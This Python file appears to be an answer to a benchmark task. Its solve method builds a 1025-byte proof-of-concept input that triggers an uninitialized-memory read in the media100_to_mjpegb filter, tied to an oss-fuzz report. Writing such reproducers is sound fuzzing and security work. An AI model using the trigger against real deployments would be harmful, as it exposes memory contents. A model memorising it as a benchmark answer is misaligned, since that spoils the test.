import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC for oss-fuzz:42537583 (media100_to_mjpegb uninitialized value).
        The vulnerability allows reading uninitialized padding from the output buffer.
        We construct a valid Media 100 packet of length 1025 to trigger the filter.
        """
        # Ground truth length is 1025
        length = 1025
        data = bytearray(length)
        
        # The media100_to_mjpegb filter reads a 32-bit big-endian integer at offset 4
        # representing the offset to the second field ('next_off').
        # We set this to 512, which is a valid offset within our 1025-byte buffer.
        # This ensures the filter parses the packet as two fields and attempts to 
        # construct an output packet, triggering the allocation/padding issue.
        next_off = 512
        struct.pack_into('>I', data, 4, next_off)
        
        # Fill the rest of the buffer with arbitrary data to simulate video content
        # avoiding all-zeros which might be interpreted as empty/black frames
        for i in range(12, length):
            data[i] = i & 0xFF
            
        return bytes(data)
